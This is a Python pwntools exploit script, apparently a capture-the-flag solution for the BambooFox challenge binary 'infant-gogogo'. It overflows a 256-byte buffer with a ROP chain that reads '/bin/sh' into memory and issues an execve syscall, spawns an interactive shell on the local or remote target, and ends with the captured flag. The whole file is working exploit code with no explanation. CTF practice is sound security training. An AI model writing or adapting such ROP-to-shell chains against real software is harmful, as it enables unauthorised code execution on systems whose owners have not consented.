#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("bamboofox.cs.nctu.edu.tw", 58795)
else:
    r = process("./infant-gogogo")


syscall = 0x462985
buf = 0x52E510

pop_rax = 0x0000000000404656
pop_rdi = 0x0000000000485abd
pop_rsi = 0x0000000000408437
pop_rdx = 0x000000000044ecf2
pop_rcx = 0x000000000041c243
syscall = 0x00000000004520b9

r.recvline()
r.sendline(flat("A" * 256, 
    pop_rax, buf,
    pop_rdi, 0,
    pop_rsi, buf,
    pop_rdx, 1024,
    pop_rax, 0,
    syscall,

    pop_rax, buf,
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rcx, 0,
    pop_rax, 59,
    syscall
    ))

sleep(0.1)
r.sendline("/bin/sh\x00")
r.interactive()

# BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}
